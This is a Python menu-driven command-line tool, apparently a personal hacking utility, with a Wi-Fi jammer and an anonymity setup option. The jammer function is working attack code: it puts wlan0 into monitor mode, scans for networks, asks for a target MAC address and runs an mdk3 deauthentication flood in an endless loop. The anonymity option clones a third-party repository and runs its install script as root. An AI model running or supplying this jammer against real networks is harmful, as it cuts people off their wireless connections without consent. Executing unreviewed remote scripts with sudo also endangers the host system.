import sys
import subprocess
import os
import time
from colorama import init, Fore, Style

# Initialize colorama
init()

def display_welcome_message():
    print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Welcome to the Cybersecurity Command Tool [KP].{Style.RESET_ALL}")
    print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Available commands:{Style.RESET_ALL}")
    print(f"    {Fore.GREEN}iam{Style.RESET_ALL} - Developer Intro")
    print(f"    {Fore.GREEN}shwcmd{Style.RESET_ALL} - Show all available commands")
    print(f"    {Fore.GREEN}exit{Style.RESET_ALL} - Exit the tool")
    print(f"{Fore.YELLOW}Type a command and press Enter:{Style.RESET_ALL}")

def show_all_commands():
    print(f"  {Fore.GREEN}wifi{Style.RESET_ALL}   - Show Wi-Fi related commands")
    print(f"  {Fore.GREEN}exit{Style.RESET_ALL}   - Exit the tool")

def show_wifi_commands():
    print(f"  {Fore.RED} If Use This You Requires SUPER USER ")
    print(f"  {Fore.GREEN}wifi_jammer{Style.RESET_ALL}   - Wifi Jammer ")
    print(f"  {Fore.GREEN}fullano{Style.RESET_ALL} - Complete Anonymous ")
    print(f"  {Fore.GREEN}exit{Style.RESET_ALL}   - Exit the tool")

def process_command(cmd):
    cmd = cmd.lower()
    
    if cmd == 'iam':
        intro_text = f"""
{Fore.CYAN}Hi, I'm Kushal Pipalya, a {Fore.GREEN}cybersecurity enthusiast{Fore.CYAN} and {Fore.YELLOW}developer.{Style.RESET_ALL}
{Fore.CYAN}I specialize in creating {Fore.MAGENTA}command-line tools{Fore.CYAN} and exploring {Fore.RED}cybersecurity concepts.{Style.RESET_ALL}
{Fore.CYAN}Feel free to ask me about various tools and techniques.{Style.RESET_ALL}
        """
        typing_speed = 0.05

        os.system('cls' if os.name == 'nt' else 'clear')

        for char in intro_text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(typing_speed)
        print()
        
    elif cmd == 'shwcmd':
        show_all_commands()
        print('-----------------------------------------------------')
        
    elif cmd == 'wifi':
        show_wifi_commands()
        print('-----------------------------------------------------')
        
    elif cmd == 'wifi_jammer':
        print(f"  {Fore.LIGHTMAGENTA_EX} Running Wi-Fi jammer script...! {Style.RESET_ALL}")
        run_wifi_jammer()
        
    elif cmd == 'fullano':
        print(f"  {Fore.LIGHTMAGENTA_EX} Running Full Anonymous setup...! {Style.RESET_ALL}")
        run_fullAnonymous()

    elif cmd in ['clear', 'clr']:
        os.system('cls' if os.name == 'nt' else 'clear')
        
    elif cmd in ['exit', 'quit']:
        print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Thank you for using the Cybersecurity Command Tool!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Kushal Pipalya | {Fore.BLUE}https://github.com/Kushal129/{Style.RESET_ALL}")
        print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
        sys.exit()
    else:
        print(f"  {Fore.RED} Unknown command try again..! {Style.RESET_ALL}")

def run_wifi_jammer():
    try:
        # Step 1: Check if mdk3 is installed
        print("Checking for mdk3...")
        result = subprocess.run(['command', '-v', 'mdk3'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print('mdk3 is not installed. Installing mdk3...')
            subprocess.run(['sudo', 'apt-get', 'update'], check=True)
            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'mdk3'], check=True)
        else:
            print('mdk3 is already installed.')

        # Step 2: Start airmon-ng on wlan0
        print('Starting airmon-ng on wlan0...')
        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'], check=True)

        # Step 3: Display network interfaces
        print('Displaying network interfaces...')
        subprocess.run(['ifconfig'], check=True)

        # Step 4: Start airodump-ng on wlan0
        print('Starting airodump-ng on wlan0...')
        subprocess.Popen(['sudo', 'airodump-ng', 'wlan0'])

        # Step 5: Continuously read the blacklist/whitelist every 3 seconds
        while True:
            # Remove file if it already exists
            if subprocess.run(['test', '-f', 'e.lst'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
                subprocess.run(['rm', 'e.lst'])

            # Prompt user for MAC address
            macid = input('Enter a MAC address: ')

            # Convert MAC address to uppercase
            macid = macid.upper()

            # Create a new file with the MAC address
            with open('e.lst', 'w') as file:
                file.write(macid + '\n')

            # Run mdk3 with the provided options
            print('Starting mdk3 with the provided options...')
            subprocess.run(['sudo', 'mdk3', 'wlan0', 'd', '-c', '1', '-b', 'e.lst'], check=True)

    except subprocess.CalledProcessError as e:
        print(f"Error running Wi-Fi jammer script: {e}")

def run_fullAnonymous():
    choice = input('Do you want to execute the script? Enter (1) or show the steps? Enter (2): ')
    if choice == '1':
        print('Using AnonGT...')

        # Define the path to the AnonGT directory
        anon_gt_dir = 'AnonGT'

        # Step 1: Check if AnonGT is installed
        if not os.path.exists(anon_gt_dir):
            print('AnonGT is not installed. Cloning the repository...')
            try:
                # Clone the repository
                subprocess.run(['git', 'clone', 'https://github.com/gt0day/AnonGT.git'], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Error cloning the repository: {e}")
                return

        # Step 2: Check if the AnonGT directory is writable
        if not os.access(anon_gt_dir, os.W_OK):
            print('Setting permissions for AnonGT...')
            try:
                subprocess.run(['chmod', '-R', '755', anon_gt_dir], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Error setting permissions: {e}")
                return

        # Step 3: Run the installation script
        install_script = os.path.join(anon_gt_dir, 'install.sh')
        if os.path.isfile(install_script):
            print('Installation script found. Proceeding with installation...')
            try:
                # Ask user for confirmation
                response = input('Do you want to run the installation script? (y/n): ').strip().lower()
                if response in ['y', 'yes']:
                    # Run the installation script
                    subprocess.run(['sudo', 'bash', install_script], check=True)
                    print('Installation completed successfully.')
                else:
                    print('Installation canceled.')
                    return
            except subprocess.CalledProcessError as e:
                print(f"Error running the installation script: {e}")
                return
        else:
            print('Installation script not found in the AnonGT directory.')
            return

        # Step 4: Run the AnonGT command to show all commands
        print('Running AnonGT to show all commands...')
        try:
            # Run AnonGT command
            result = subprocess.run(['sudo', 'AnonGT', 'cmd'], capture_output=True, text=True, check=True)
            print('Available commands in AnonGT:')
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f"Error running AnonGT command: {e}")

    elif choice == '2':
        print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
        print(f"        {Fore.YELLOW}Showing the steps to set up AnonGT: {Style.RESET_ALL}")
        print(f"{Fore.RED}NOTE: You are in Super User mode. {Style.RESET_ALL}")
        print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
        print(f"{Fore.GREEN}S-1.{Style.RESET_ALL} If AnonGT is not installed?")
        print(f"  {Fore.BLUE}git clone https://github.com/gt0day/AnonGT.git {Style.RESET_ALL}")
        print("")
        print(f"{Fore.GREEN}S-2.{Style.RESET_ALL} Go to the AnonGT folder and run: sudo bash install.sh")
        print("")
        print("- After successful installation, you can use AnonGT.")
        print(f"- Default help menu: {Fore.LIGHTCYAN_EX} sudo anongt {Style.RESET_ALL}")
        print(f"     Example: {Fore.LIGHTCYAN_EX} sudo anongt start {Style.RESET_ALL} or {Fore.LIGHTCYAN_EX} sudo anongt stop {Style.RESET_ALL}")
        print("")
        print(f"{Fore.CYAN}------------------------------------------------{Style.RESET_ALL}")
    else:
        print('Invalid choice. Please enter 1 or 2.')

def main():
    while True:
        display_welcome_message()
        user_input = input(f"{Fore.GREEN}-> {Style.RESET_ALL}")
        process_command(user_input)

if __name__ == '__main__':
    main()
